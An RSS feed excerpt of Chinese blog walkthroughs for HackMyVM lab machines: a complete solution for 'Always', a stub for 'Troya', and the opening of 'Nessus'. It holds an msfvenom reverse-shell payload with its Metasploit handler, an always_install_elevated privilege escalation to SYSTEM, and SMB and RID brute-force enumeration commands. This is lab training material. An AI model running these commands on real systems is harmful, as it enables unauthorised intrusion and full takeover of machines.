<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.010.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/3.quick.html</link><guid isPermaLink="false">24-渗透/HMV/3.quick.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[29.Always]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 网站主页" data-href="#2.1. 网站主页" href="https://www.c1trus.top/about:blank#2.1._网站主页" class="internal-link" target="_self" rel="noopener nofollow">2.1. 网站主页</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.3. 网站后台" data-href="#2.3. 网站后台" href="https://www.c1trus.top/about:blank#2.3._网站后台" class="internal-link" target="_self" rel="noopener nofollow">2.3. 网站后台</a>


<br><a data-tooltip-position="top" aria-label="3. SMB" data-href="#3. SMB" href="https://www.c1trus.top/about:blank#3._SMB" class="internal-link" target="_self" rel="noopener nofollow">3. SMB</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMB空会话检测" data-href="#3.1. SMB空会话检测" href="https://www.c1trus.top/about:blank#3.1._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMB空会话检测</a>


<br><a data-tooltip-position="top" aria-label="4. FTP" data-href="#4. FTP" href="https://www.c1trus.top/about:blank#4._FTP" class="internal-link" target="_self" rel="noopener nofollow">4. FTP</a>
<br><a data-tooltip-position="top" aria-label="5. 网址后台" data-href="#5. 网址后台" href="https://www.c1trus.top/about:blank#5._网址后台" class="internal-link" target="_self" rel="noopener nofollow">5. 网址后台</a>

<br><a data-tooltip-position="top" aria-label="5.1. 前段验证密码" data-href="#5.1. 前段验证密码" href="https://www.c1trus.top/about:blank#5.1._前段验证密码" class="internal-link" target="_self" rel="noopener nofollow">5.1. 前段验证密码</a>


<br><a data-tooltip-position="top" aria-label="6. ftp登录" data-href="#6. ftp登录" href="https://www.c1trus.top/about:blank#6._ftp登录" class="internal-link" target="_self" rel="noopener nofollow">6. ftp登录</a><br>
- <a data-tooltip-position="top" aria-label="6.1.1. 管理员的提示" data-href="#6.1.1. 管理员的提示" href="https://www.c1trus.top/about:blank#6.1.1._管理员的提示" class="internal-link" target="_self" rel="noopener nofollow">6.1.1. 管理员的提示</a>
<br><a data-tooltip-position="top" aria-label="7. ftp用户登录" data-href="#7. ftp用户登录" href="https://www.c1trus.top/about:blank#7._ftp用户登录" class="internal-link" target="_self" rel="noopener nofollow">7. ftp用户登录</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Always" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Always</a><br>
作者 ysnmrtksk<br>
难度 ⭐️⭐️⭐️
<br><br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# fping -aqg 192.168.56.0/24
192.168.56.2
192.168.56.6
192.168.56.19

┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# fscan -h 192.168.56.19

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.19:445 open
192.168.56.19:139 open
192.168.56.19:135 open
192.168.56.19:21 open
192.168.56.19:8080 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo
[*]192.168.56.19
   [-&gt;]Always-PC
   [-&gt;]192.168.56.19
[*] OsInfo 192.168.56.19        (Windows 7 Professional 7601 Service Pack 1)
[*] WebTitle http://192.168.56.19:8080 code:200 len:178    title:We Are Sorry
已完成 5/5
[*] 扫描结束,耗时: 2.252398436s

<br><br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# curl http://192.168.56.19:8080
&lt;DOCTYPE html&gt;
&lt;head&gt;
        &lt;title&gt;We Are Sorry&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
        &lt;center&gt;&lt;h1&gt;Our Site Is Under Maintenance. Please Come Back Again Later.&lt;/h1&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
<br>提示网站正在维护，过会再来<br><br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# dirsearch -u http://192.168.56.19:8080

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Awayls/reports/http_192.168.56.19_8080/_24-11-25_22-45-05.txt

Target: http://192.168.56.19:8080/

[22:45:08] 301 -  240B  - /ADMIN  -&gt;  http://192.168.56.19:8080/ADMIN/
[22:45:08] 301 -  240B  - /Admin  -&gt;  http://192.168.56.19:8080/Admin/
[22:45:08] 200 -    3KB - /admin%20/
[22:45:08] 301 -  240B  - /admin  -&gt;  http://192.168.56.19:8080/admin/
[22:45:08] 301 -  241B  - /admin.  -&gt;  http://192.168.56.19:8080/admin./
[22:45:09] 200 -    3KB - /Admin/
[22:45:09] 200 -    3KB - /admin/
[22:45:09] 200 -    3KB - /admin/index.html
[22:45:12] 403 -  199B  - /cgi-bin/
[22:45:12] 500 -  530B  - /cgi-bin/printenv.pl
[22:45:16] 403 -  199B  - /index.php::$DATA
[22:45:24] 403 -  199B  - /Trace.axd::$DATA
[22:45:26] 403 -  199B  - /web.config::$DATA

<br><br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png" referrerpolicy="no-referrer"><br>
尝试一下简单的弱口令<br>
没有登录成功。并且这里我们不能根据回显判断用户是否存在。<br>
先看下SMB SMB走不通在回来看这个网站尝试爆破<br><br><br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# smbmap -u anonymous -H 192.168.56.19

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

<br>不存在空会话用户<br>
因为这里没有域，也没有开放88端口（Kerberos的端口），所以我们也不能尝试进行kerbrute爆破<br><br>检测一下ftp是否存在匿名登录<br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# ftp 192.168.56.19
Connected to 192.168.56.19.
220 Microsoft FTP Service
Name (192.168.56.19:root): anonymous
331 Password required for anonymous.
Password:
530 User cannot log in.
ftp: Login failed

<br>也不存在ftp匿名登录<br>
那看来只能干网站了<br><br><br>尝试抓包爆破时发现 点了Login抓不到包<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230241.png" referrerpolicy="no-referrer"><br>
说明这里是前段验证<br>直接看代码<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230328.png" referrerpolicy="no-referrer"><br>
获取到用户与密码<br>admin：adminpass123
<br>成功登录后台<br>进来后获取到了一个提示<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230433.png" referrerpolicy="no-referrer"><br>ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=
<br>解密<br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# echo 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' |base64 -d
ftpuser:KeepGoingBro!!!    
<br><br>利用给的ftp账号密码登录<br>
ftpuser:KeepGoingBro!!! <br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# ftp 192.168.56.19
Connected to 192.168.56.19.
220 Microsoft FTP Service
Name (192.168.56.19:root): ftpuser
331 Password required for ftpuser.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls -a
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
10-01-24  07:17PM                   56 robots.txt
226 Transfer complete.
ftp&gt; get robots.txt
local: robots.txt remote: robots.txt
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |****************************************************|    56      314.29 KiB/s    00:00 ETA
226 Transfer complete.
56 bytes received in 00:00 (103.57 KiB/s)
ftp&gt; exit
221 Goodbye.

┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# cat robots.txt
User-agent: *
Disallow: /admins-secret-pagexxx.html

<br>获取到一个路径 /admins-secret-pagexxx.html<br><br>访问获取到管理员的提示 <br> ## Admin's Secret Notes

- 1) Disable the firewall and Windows Defender.
- 2) Enable FTP and SSH.
- 3) Start the Apache server.
- 4) Don't forget to change the password for user 'always'. Current password is "WW91Q2FudEZpbmRNZS4hLiE=".
<br>┌──(root㉿kali)-[/home/kali/hmv/Awayls]
└─# echo 'WW91Q2FudEZpbmRNZS4hLiE=' |base64 -d
YouCantFindMe.!.!  
<br>根据第四条提示可以知道<br>
用户 always<br>
密码 YouCantFindMe.!.!
<br>尝试利用winrm登录<br>
发现登不进去、原来解码后的不是密码。而是提示😅<br>那就找一下密码吧<br><br>找了半天没有找到，看wp原来要直接从vbox登录Ftpuser用户<br>
我其实有测试过winrm登录这个用户<br>
但是失败了。我是没想到原来要从Vbox登录的。 果然是靶机啊。实战哪里有人把电脑拿过来给你登啊😅<br>进来后把屏幕键盘点出来，不然你会被恶心死的🤮<br>
记得把左上角切换成EN<br>
<img alt="assets/Pasted image 20241224205846.png" src="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241224205846.png"><br>利用密码 KeepGoingBro!!! 进去，后提权就行了<br>提权很简单。我思路是直接传一个cs后门，然后直接提就行了。<br>
<img alt="assets/Pasted image 20241224210216.png" src="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241224210216.png"><br>生成msf后门上传 上去然后运行上线msf<br>生成后门
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.6 lport=7788 -f exe &gt; msf7788.exe

开启监听
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.6
set lport 7788
run

msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 192.168.56.6:7788
[*] Sending stage (176198 bytes) to 192.168.56.25
[*] Meterpreter session 1 opened (192.168.56.6:7788 -&gt; 192.168.56.25:54117) at 2024-12-24 08:10:03 -0500

meterpreter &gt;
<br>然后利用 local_exploit_suggester 模块 进行检测提权漏洞<br>background 回到后台
user post/multi/recon/local_exploit_suggester
set session 1
run

msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1
session =&gt; 1
msf6 post(multi/recon/local_exploit_suggester) &gt; run

[*] fe80::c471:5b9c:b92e:7e8a - Collecting local exploits for x86/windows...
[*] fe80::c471:5b9c:b92e:7e8a - 193 exploit checks are being tried...
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] fe80::c471:5b9c:b92e:7e8a - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

<br>这里我们就使用推荐的第一个模块 exploit/windows/local/always_install_elevated<br>msf6 exploit(windows/local/always_install_elevated) &gt; use exploit/windows/local/always_install_elevated
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) &gt; show options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/always_install_elevated) &gt; set lhost 192.168.56.6
lhost =&gt; 192.168.56.6
msf6 exploit(windows/local/always_install_elevated) &gt; set lport 7788
lport =&gt; 7788
msf6 exploit(windows/local/always_install_elevated) &gt; set session 1
session =&gt; 1
msf6 exploit(windows/local/always_install_elevated) &gt; run

[*] Started reverse TCP handler on 192.168.56.6:7788
[*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\VEPgFpavVN.msi ...
[*] Executing MSI...
[*] Sending stage (176198 bytes) to 192.168.56.25
[+] Deleted C:\Users\ftpuser\AppData\Local\Temp\VEPgFpavVN.msi
[*] Meterpreter session 2 opened (192.168.56.6:7788 -&gt; 192.168.56.25:54480) at 2024-12-24 08:16:38 -0500

meterpreter &gt; shell
Process 1976 created.
Channel 2 created.
Microsoft Windows [S▒r▒m 6.1.7601]
Telif Hakk▒ (c) 2009 Microsoft Corporation. T▒m haklar▒ sakl▒d▒r.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

<br>最后是flag<br>HMV{You_Found_Me!}
<br>HMV{White_Flag_Raised}
]]></description><link>https://www.c1trus.top/24-渗透/hmv/29.always.html</link><guid isPermaLink="false">24-渗透/HMV/29.Always.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[28.Troya]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Troya
<br>作者：sml
<br>难度：
<br>
出不了网整不了
<br>信息收集<br>
知识点：<br>
```Plain Text
nmap -sV 192.168.9.19  -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 19:02 CST
Nmap scan report for 192.168.9.19
Host is up (0.00025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
MAC Address: 08:00:27:D0:C1:B2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
<br>目录扫描<br>扫描啥都没有<br>主页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" referrerpolicy="no-referrer"><br>抓包看看]]></description><link>https://www.c1trus.top/24-渗透/hmv/28.troya.html</link><guid isPermaLink="false">24-渗透/HMV/28.Troya.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[27.Nessus]]></title><description><![CDATA[ 
 <br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. SMB 空会话检测" data-href="#3. SMB 空会话检测" href="https://www.c1trus.top/about:blank#3._SMB_空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3. SMB 空会话检测</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMBcilent 连接" data-href="#3.1. SMBcilent 连接" href="https://www.c1trus.top/about:blank#3.1._SMBcilent_连接" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMBcilent 连接</a>
<br><a data-tooltip-position="top" aria-label="3.2. Nessus 报告检测" data-href="#3.2. Nessus 报告检测" href="https://www.c1trus.top/about:blank#3.2._Nessus_报告检测" class="internal-link" target="_self" rel="noopener nofollow">3.2. Nessus 报告检测</a>


<br><a data-tooltip-position="top" aria-label="4. RID-bruteforce" data-href="#4. RID-bruteforce" href="https://www.c1trus.top/about:blank#4._RID-bruteforce" class="internal-link" target="_self" rel="noopener nofollow">4. RID-bruteforce</a>
<br><a data-tooltip-position="top" aria-label="5. 检测报告利用" data-href="#5. 检测报告利用" href="https://www.c1trus.top/about:blank#5._检测报告利用" class="internal-link" target="_self" rel="noopener nofollow">5. 检测报告利用</a>
<br><a data-tooltip-position="top" aria-label="6. Nessus 爆破" data-href="#6. Nessus 爆破" href="https://www.c1trus.top/about:blank#6._Nessus_爆破" class="internal-link" target="_self" rel="noopener nofollow">6. Nessus 爆破</a>

<br><a data-tooltip-position="top" aria-label="6.1. 代理获取密码" data-href="#6.1. 代理获取密码" href="https://www.c1trus.top/about:blank#6.1._代理获取密码" class="internal-link" target="_self" rel="noopener nofollow">6.1. 代理获取密码</a>
<br><a data-tooltip-position="top" aria-label="6.2. winrm连接" data-href="#6.2. winrm连接" href="https://www.c1trus.top/about:blank#6.2._winrm连接" class="internal-link" target="_self" rel="noopener nofollow">6.2. winrm连接</a>


<br><a data-tooltip-position="top" aria-label="7. dll注入" data-href="#7. dll注入" href="https://www.c1trus.top/about:blank#7._dll注入" class="internal-link" target="_self" rel="noopener nofollow">7. dll注入</a>

<br><a data-tooltip-position="top" aria-label="7.1. 提权检测" data-href="#7.1. 提权检测" href="https://www.c1trus.top/about:blank#7.1._提权检测" class="internal-link" target="_self" rel="noopener nofollow">7.1. 提权检测</a>
<br><a data-tooltip-position="top" aria-label="7.2. dll制作" data-href="#7.2. dll制作" href="https://www.c1trus.top/about:blank#7.2._dll制作" class="internal-link" target="_self" rel="noopener nofollow">7.2. dll制作</a>


<br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. SMB 空会话检测" data-href="#3. SMB 空会话检测" href="https://www.c1trus.top/about:blank#3._SMB_空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3. SMB 空会话检测</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMBcilent 连接" data-href="#3.1. SMBcilent 连接" href="https://www.c1trus.top/about:blank#3.1._SMBcilent_连接" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMBcilent 连接</a>
<br><a data-tooltip-position="top" aria-label="3.2. Nessus 报告检测" data-href="#3.2. Nessus 报告检测" href="https://www.c1trus.top/about:blank#3.2._Nessus_报告检测" class="internal-link" target="_self" rel="noopener nofollow">3.2. Nessus 报告检测</a>


<br><a data-tooltip-position="top" aria-label="4. RID-bruteforce" data-href="#4. RID-bruteforce" href="https://www.c1trus.top/about:blank#4._RID-bruteforce" class="internal-link" target="_self" rel="noopener nofollow">4. RID-bruteforce</a>
<br><a data-tooltip-position="top" aria-label="5. 检测报告利用" data-href="#5. 检测报告利用" href="https://www.c1trus.top/about:blank#5._检测报告利用" class="internal-link" target="_self" rel="noopener nofollow">5. 检测报告利用</a>
<br><a data-tooltip-position="top" aria-label="6. Nessus 爆破" data-href="#6. Nessus 爆破" href="https://www.c1trus.top/about:blank#6._Nessus_爆破" class="internal-link" target="_self" rel="noopener nofollow">6. Nessus 爆破</a>

<br><a data-tooltip-position="top" aria-label="6.1. 代理获取密码" data-href="#6.1. 代理获取密码" href="https://www.c1trus.top/about:blank#6.1._代理获取密码" class="internal-link" target="_self" rel="noopener nofollow">6.1. 代理获取密码</a>
<br><a data-tooltip-position="top" aria-label="6.2. winrm连接" data-href="#6.2. winrm连接" href="https://www.c1trus.top/about:blank#6.2._winrm连接" class="internal-link" target="_self" rel="noopener nofollow">6.2. winrm连接</a>


<br><a data-tooltip-position="top" aria-label="7. dll注入" data-href="#7. dll注入" href="https://www.c1trus.top/about:blank#7._dll注入" class="internal-link" target="_self" rel="noopener nofollow">7. dll注入</a><br>
- <a data-tooltip-position="top" aria-label="7.1. 提权检测" data-href="#7.1. 提权检测" href="https://www.c1trus.top/about:blank#7.1._提权检测" class="internal-link" target="_self" rel="noopener nofollow">7.1. 提权检测</a><br>
- <a data-tooltip-position="top" aria-label="7.2. dll制作" data-href="#7.2. dll制作" href="https://www.c1trus.top/about:blank#7.2._dll制作" class="internal-link" target="_self" rel="noopener nofollow">7.2. dll制作</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Nessus" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Nessus</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=josemlwdf" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=josemlwdf" target="_blank">josemlwdf</a><br>
难度 ⭐️⭐️⭐️⭐️
<br><br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# fping -aqg 192.168.56.0/24
192.168.56.2
192.168.56.6
192.168.56.156

┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# fscan -h 192.168.56.156

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.156:445 open
192.168.56.156:139 open
192.168.56.156:135 open
192.168.56.156:8834 open
[*] alive ports len is: 4
start vulscan
[*] NetBios 192.168.56.156  WORKGROUP\NESSUS
[*] NetInfo
[*]192.168.56.156
   [-&gt;]Nessus
   [-&gt;]192.168.56.156
[*] WebTitle https://192.168.56.156:8834 code:200 len:1217   title:Nessus
已完成 4/4

<br>开了一个网页。尝试访问 <a rel="noopener nofollow" class="external-link" href="https://192.168.56.156:8834" target="_blank">https://192.168.56.156:8834</a><img alt="jbolsp8toi" src="https://www.c1trus.top/24-渗透/hmv/assets/kxrxpqqr598.png"><br>
这就是 Nessus<br><br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# smbmap -u anonymous -H 192.168.56.156

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.56.156:445      Name: 192.168.56.156            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Documents                                               READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC

<br>发现两个共享的目录其中一个还有写权限<br>
Documents IPC$ <br><br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# smbclient -U 'anonymous' //192.168.56.156/IPC$
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \&gt; exit

┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# smbclient -U 'anonymous' //192.168.56.156/Documents
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                  DR        0  Sun Nov 24 14:01:18 2024
  ..                                  D        0  Sat Oct 19 13:08:23 2024
  desktop.ini                       AHS      402  Sun Jun 16 01:54:33 2024
  My Basic Network Scan_hwhm7q.pdf      A   122006  Sat Oct 19 06:19:59 2024
  My Music                        DHSrn        0  Sun Jun 16 01:54:27 2024
  My Pictures                     DHSrn        0  Sun Jun 16 01:54:27 2024
  My Videos                       DHSrn        0  Sun Jun 16 01:54:27 2024
  Web Application Tests_f6jg9t.pdf      A   136025  Sat Oct 19 06:20:14 2024

                12942591 blocks of size 4096. 10637803 blocks available

smb: \&gt; get "My Basic Network Scan_hwhm7q.pdf"
getting file \My Basic Network Scan_hwhm7q.pdf of size 122006 as My Basic Network Scan_hwhm7q.pdf (6619.2 KiloBytes/sec) (average 6619.2 KiloBytes/sec)
smb: \&gt; get "Web Application Tests_f6jg9t.pdf"
getting file \Web Application Tests_f6jg9t.pdf of size 136025 as Web Application Tests_f6jg9t.pdf (7813.9 KiloBytes/sec) (average 7199.5 KiloBytes/sec)

<br>
这里文件都是有空格的。读取的时候记得加上双引号包起来
<br><br>下载的两个 pdf 文件里面是 Nessus 的检测报告，<br><img alt="2pptmtbbfyw" src="https://www.c1trus.top/24-渗透/hmv/assets/l70fhfkoz6.png"><br><img alt="ubj32k2rds" src="https://www.c1trus.top/24-渗透/hmv/assets/ouekbtxpf4p.png"><br>
这里看着有一大堆洞。但我先不考虑去利用他，因为我不会<br><br>靶机开放了 135（RPC 服务）与 445(SMB 服务) 而且还允许 SMB 匿名访问<br>
那么我们就可以进行 RID 枚举爆破出域内用户信息<br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# crackmapexec smb 192.168.56.156 -u 'anonymous' -p '' --rid-brute &gt; rid_bruteforce.txt

┌──(root㉿kali)-[/home/kali/hmv/Nessus]
